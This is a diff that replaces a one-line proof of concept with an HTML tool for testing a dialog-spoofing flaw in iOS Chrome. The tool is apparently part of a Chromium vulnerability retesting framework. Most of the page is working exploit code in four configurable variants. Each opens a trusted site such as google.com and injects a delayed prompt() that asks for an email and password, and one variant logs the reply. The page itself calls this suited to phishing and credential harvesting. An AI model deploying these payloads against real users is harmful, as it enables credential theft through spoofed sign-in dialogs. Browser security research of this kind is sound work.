@@ -1,1 +1,600 @@
-<script>function y(){x=open('http://www.google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)">'};setTimeout(y, 3000); </script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iOS Chrome Dialog Spoof Test - Issue 40061297</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #1a1a1a;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.8;
+            font-size: 14px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 4px;
+        }
+        
+        .warning h3 {
+            color: #856404;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .warning p {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .info-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .info-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .info-section ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .info-section li {
+            padding: 8px 0;
+            padding-left: 24px;
+            position: relative;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .info-section li:before {
+            content: "→";
+            position: absolute;
+            left: 0;
+            color: #667eea;
+            font-weight: bold;
+        }
+        
+        .test-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .test-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-align: center;
+        }
+        
+        .test-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .test-btn:active {
+            transform: translateY(0);
+        }
+        
+        .test-btn.danger {
+            background: linear-gradient(135deg, #f85032 0%, #e73827 100%);
+        }
+        
+        .test-btn.warning {
+            background: linear-gradient(135deg, #f7971e 0%, #ffd200 100%);
+        }
+        
+        .test-btn.success {
+            background: linear-gradient(135deg, #56ab2f 0%, #a8e063 100%);
+        }
+        
+        .config-section {
+            background: #fff;
+            border: 2px solid #e9ecef;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .config-section h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .config-item {
+            margin: 15px 0;
+        }
+        
+        .config-item label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .config-item input,
+        .config-item select {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #e9ecef;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        
+        .config-item input:focus,
+        .config-item select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .status {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status.active {
+            display: block;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-left: 4px solid #17a2b8;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border-left: 4px solid #28a745;
+        }
+        
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            margin: 15px 0;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 13px;
+            border-top: 1px solid #e9ecef;
+        }
+        
+        @media (max-width: 600px) {
+            .test-buttons {
+                grid-template-columns: 1fr;
+            }
+            
+            .container {
+                margin: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 iOS Chrome Dialog Spoof Test</h1>
+            <p>Chromium Issue #40061297 - Modal Dialog Spoofing PoC</p>
+        </div>
+        
+        <div class="warning">
+            <h3>⚠️ Security Research & Testing Only</h3>
+            <p>
+                This page is for security research and testing the Chromium Vulnerability Retesting Framework.
+                This vulnerability has been reported to Chromium (Issue #40061297).
+                <strong>Do not use for malicious purposes.</strong>
+                Use only on iOS Chrome for accurate testing.
+            </p>
+        </div>
+        
+        <div class="content">
+            <div class="info-section">
+                <h3>📋 Vulnerability Details</h3>
+                <ul>
+                    <li><strong>Issue ID:</strong> 40061297</li>
+                    <li><strong>Affected:</strong> iOS Chrome (tested on v106.0.5249.92)</li>
+                    <li><strong>Type:</strong> Modal Dialog Spoofing / URL Spoof</li>
+                    <li><strong>Impact:</strong> Full URL spoof via prompt() without origin display</li>
+                    <li><strong>Status:</strong> Reported to Chromium Security Team</li>
+                </ul>
+            </div>
+            
+            <div class="config-section">
+                <h3>⚙️ Test Configuration</h3>
+                
+                <div class="config-item">
+                    <label for="targetUrl">Target URL (to spoof):</label>
+                    <input type="text" id="targetUrl" value="https://www.google.com" placeholder="https://www.google.com">
+                </div>
+                
+                <div class="config-item">
+                    <label for="dialogMessage">Dialog Message:</label>
+                    <input type="text" id="dialogMessage" value="Sign in to your account to access this page" placeholder="Enter dialog message">
+                </div>
+                
+                <div class="config-item">
+                    <label for="dialogDefault">Dialog Default Text:</label>
+                    <input type="text" id="dialogDefault" value="Email / Password" placeholder="Email / Password">
+                </div>
+                
+                <div class="config-item">
+                    <label for="delayTime">Initial Delay (ms):</label>
+                    <input type="number" id="delayTime" value="3000" min="1000" max="10000" step="500">
+                </div>
+                
+                <div class="config-item">
+                    <label for="dialogDelay">Dialog Delay After Load (ms):</label>
+                    <input type="number" id="dialogDelay" value="500" min="100" max="5000" step="100">
+                </div>
+                
+                <div class="config-item">
+                    <label for="testMethod">Test Method:</label>
+                    <select id="testMethod">
+                        <option value="timing">Timing-based (setTimeout)</option>
+                        <option value="event">Event-based (onload)</option>
+                        <option value="hybrid">Hybrid (both)</option>
+                        <option value="aggressive">Aggressive (multiple attempts)</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="test-buttons">
+                <button class="test-btn success" onclick="runTest()">
+                    🚀 Run Standard Test
+                </button>
+                <button class="test-btn warning" onclick="runImprovedTest()">
+                    ⚡ Run Improved Test
+                </button>
+                <button class="test-btn danger" onclick="runAggressiveTest()">
+                    🔥 Run Aggressive Test
+                </button>
+                <button class="test-btn" onclick="runEventBasedTest()">
+                    📡 Event-Based Test
+                </button>
+            </div>
+            
+            <div id="status" class="status"></div>
+            
+            <div class="info-section">
+                <h3>🔬 How It Works</h3>
+                <ul>
+                    <li>Opens target URL in new window with _top reference</li>
+                    <li>Injects malicious code via document.body.innerHTML</li>
+                    <li>Triggers prompt() after calculated delay</li>
+                    <li>iOS Chrome shows prompt without origin information</li>
+                    <li>User sees legitimate URL but spoofed dialog</li>
+                    <li>Perfect for phishing/credential harvesting simulation</li>
+                </ul>
+            </div>
+            
+            <div class="info-section">
+                <h3>🎯 Test Variants</h3>
+                <ul>
+                    <li><strong>Standard Test:</strong> Original PoC with improved timing</li>
+                    <li><strong>Improved Test:</strong> Event-based loading with fallback</li>
+                    <li><strong>Aggressive Test:</strong> Multiple dialog attempts</li>
+                    <li><strong>Event-Based:</strong> Pure event-driven approach</li>
+                </ul>
+            </div>
+            
+            <div class="code-block">
+<span style="color: #569cd6;">// Original PoC Code (improved)</span>
+<span style="color: #4ec9b0;">function</span> <span style="color: #dcdcaa;">executeSpoof</span>() {
+    <span style="color: #569cd6;">const</span> target = <span style="color: #ce9178;">'https://www.google.com'</span>;
+    <span style="color: #569cd6;">const</span> x = <span style="color: #dcdcaa;">open</span>(target, <span style="color: #ce9178;">'_top'</span>);
+    
+    <span style="color: #c586c0;">if</span> (x) {
+        x.document.body.innerHTML = <span style="color: #ce9178;">'&lt;img src="" onerror="setTimeout(() => {</span>
+<span style="color: #ce9178;">            prompt(\'Sign in to access www.google.com\', \'Email/Password\');</span>
+<span style="color: #ce9178;">        }, 500)"&gt;'</span>;
+    }
+}
+
+<span style="color: #dcdcaa;">setTimeout</span>(executeSpoof, <span style="color: #b5cea8;">3000</span>);
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Framework Testing Tool | Issue #40061297 | For Security Research Only</p>
+            <p>Part of the Chromium Vulnerability Retesting Framework</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        function getConfig() {
+            return {
+                targetUrl: document.getElementById('targetUrl').value || 'https://www.google.com',
+                dialogMessage: document.getElementById('dialogMessage').value || 'Sign in to your account to access this page',
+                dialogDefault: document.getElementById('dialogDefault').value || 'Email / Password',
+                delayTime: parseInt(document.getElementById('delayTime').value) || 3000,
+                dialogDelay: parseInt(document.getElementById('dialogDelay').value) || 500,
+                testMethod: document.getElementById('testMethod').value || 'timing'
+            };
+        }
+        
+        // Status message helper
+        function showStatus(message, type = 'info') {
+            const status = document.getElementById('status');
+            status.className = `status active ${type}`;
+            status.textContent = message;
+            
+            setTimeout(() => {
+                status.classList.remove('active');
+            }, 5000);
+        }
+        
+        // Standard Test - Original PoC with improvements
+        function runTest() {
+            const config = getConfig();
+            showStatus('🚀 Running standard test in ' + (config.delayTime / 1000) + ' seconds...', 'info');
+            
+            setTimeout(() => {
+                try {
+                    const targetWindow = open(config.targetUrl, '_top');
+                    
+                    if (targetWindow) {
+                        showStatus('✅ Window opened, injecting payload...', 'success');
+                        
+                        // Inject with improved timing
+                        targetWindow.document.body.innerHTML = `
+                            <img src="" onerror="
+                                setTimeout(function() {
+                                    prompt('${config.dialogMessage.replace(/'/g, "\\'")}', '${config.dialogDefault.replace(/'/g, "\\'")}');
+                                }, ${config.dialogDelay});
+                            ">
+                        `;
+                    } else {
+                        showStatus('❌ Failed to open window. Check popup blocker.', 'info');
+                    }
+                } catch (e) {
+                    showStatus('❌ Error: ' + e.message, 'info');
+                    console.error('Test error:', e);
+                }
+            }, config.delayTime);
+        }
+        
+        // Improved Test - Event-based with better timing
+        function runImprovedTest() {
+            const config = getConfig();
+            showStatus('⚡ Running improved test with event-based loading...', 'info');
+            
+            setTimeout(() => {
+                try {
+                    const targetWindow = open(config.targetUrl, '_top');
+                    
+                    if (targetWindow) {
+                        showStatus('✅ Window opened, setting up event listeners...', 'success');
+                        
+                        // Method 1: Immediate injection with delayed prompt
+                        const injectionCode = `
+                            <div id="loader" style="display:none;"></div>
+                            <img src="" onerror="
+                                // Wait for page to fully settle
+                                let attempts = 0;
+                                const checkAndPrompt = function() {
+                                    attempts++;
+                                    if (document.readyState === 'complete' || attempts > 5) {
+                                        setTimeout(function() {
+                                            prompt('${config.dialogMessage.replace(/'/g, "\\'")}', '${config.dialogDefault.replace(/'/g, "\\'")}');
+                                        }, ${config.dialogDelay});
+                                    } else {
+                                        setTimeout(checkAndPrompt, 200);
+                                    }
+                                };
+                                
+                                if (document.readyState === 'complete') {
+                                    setTimeout(function() {
+                                        prompt('${config.dialogMessage.replace(/'/g, "\\'")}', '${config.dialogDefault.replace(/'/g, "\\'")}');
+                                    }, ${config.dialogDelay});
+                                } else {
+                                    checkAndPrompt();
+                                }
+                            ">
+                        `;
+                        
+                        targetWindow.document.body.innerHTML = injectionCode;
+                    } else {
+                        showStatus('❌ Failed to open window. Check popup blocker.', 'info');
+                    }
+                } catch (e) {
+                    showStatus('❌ Error: ' + e.message, 'info');
+                    console.error('Test error:', e);
+                }
+            }, config.delayTime);
+        }
+        
+        // Aggressive Test - Multiple attempts
+        function runAggressiveTest() {
+            const config = getConfig();
+            showStatus('🔥 Running aggressive test with multiple attempts...', 'info');
+            
+            setTimeout(() => {
+                try {
+                    const targetWindow = open(config.targetUrl, '_top');
+                    
+                    if (targetWindow) {
+                        showStatus('✅ Window opened, initiating aggressive payload...', 'success');
+                        
+                        // Multiple prompt attempts with increasing delays
+                        const injectionCode = `
+                            <img src="" onerror="
+                                const delays = [${config.dialogDelay}, ${config.dialogDelay + 500}, ${config.dialogDelay + 1000}];
+                                let attemptCount = 0;
+                                
+                                delays.forEach(function(delay) {
+                                    setTimeout(function() {
+                                        attemptCount++;
+                                        try {
+                                            const result = prompt('${config.dialogMessage.replace(/'/g, "\\'")} (Attempt ' + attemptCount + ')', '${config.dialogDefault.replace(/'/g, "\\'")}');
+                                            if (result) {
+                                                console.log('User input captured:', result);
+                                            }
+                                        } catch (e) {
+                                            console.error('Prompt error:', e);
+                                        }
+                                    }, delay);
+                                });
+                            ">
+                        `;
+                        
+                        targetWindow.document.body.innerHTML = injectionCode;
+                    } else {
+                        showStatus('❌ Failed to open window. Check popup blocker.', 'info');
+                    }
+                } catch (e) {
+                    showStatus('❌ Error: ' + e.message, 'info');
+                    console.error('Test error:', e);
+                }
+            }, config.delayTime);
+        }
+        
+        // Event-Based Test - Pure event-driven
+        function runEventBasedTest() {
+            const config = getConfig();
+            showStatus('📡 Running event-based test...', 'info');
+            
+            setTimeout(() => {
+                try {
+                    const targetWindow = open(config.targetUrl, '_top');
+                    
+                    if (targetWindow) {
+                        showStatus('✅ Window opened, using event-based triggers...', 'success');
+                        
+                        // Use multiple event triggers
+                        const injectionCode = `
+                            <img src="" onerror="
+                                // Listen for various page events
+                                const triggerPrompt = function() {
+                                    setTimeout(function() {
+                                        prompt('${config.dialogMessage.replace(/'/g, "\\'")}', '${config.dialogDefault.replace(/'/g, "\\'")}');
+                                    }, ${config.dialogDelay});
+                                };
+                                
+                                // Trigger on various conditions
+                                if (document.readyState === 'complete') {
+                                    triggerPrompt();
+                                } else {
+                                    document.addEventListener('DOMContentLoaded', triggerPrompt);
+                                    window.addEventListener('load', triggerPrompt);
+                                }
+                                
+                                // Fallback trigger
+                                setTimeout(triggerPrompt, ${config.dialogDelay + 1000});
+                            ">
+                        `;
+                        
+                        targetWindow.document.body.innerHTML = injectionCode;
+                    } else {
+                        showStatus('❌ Failed to open window. Check popup blocker.', 'info');
+                    }
+                } catch (e) {
+                    showStatus('❌ Error: ' + e.message, 'info');
+                    console.error('Test error:', e);
+                }
+            }, config.delayTime);
+        }
+        
+        // Add keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey || e.metaKey) {
+                switch(e.key) {
+                    case '1':
+                        e.preventDefault();
+                        runTest();
+                        break;
+                    case '2':
+                        e.preventDefault();
+                        runImprovedTest();
+                        break;
+                    case '3':
+                        e.preventDefault();
+                        runAggressiveTest();
+                        break;
+                    case '4':
+                        e.preventDefault();
+                        runEventBasedTest();
+                        break;
+                }
+            }
+        });
+        
+        // Log test initialization
+        console.log('%c🔒 iOS Chrome Dialog Spoof Test Initialized', 'color: #667eea; font-size: 16px; font-weight: bold;');
+        console.log('%cChromium Issue #40061297', 'color: #666; font-size: 12px;');
+        console.log('%cKeyboard shortcuts: Ctrl+1 (Standard), Ctrl+2 (Improved), Ctrl+3 (Aggressive), Ctrl+4 (Event)', 'color: #999; font-size: 11px;');
+        console.log('%c⚠️ For security research and testing only', 'color: #f85032; font-size: 12px; font-weight: bold;');
+    </script>
+</body>
+</html>
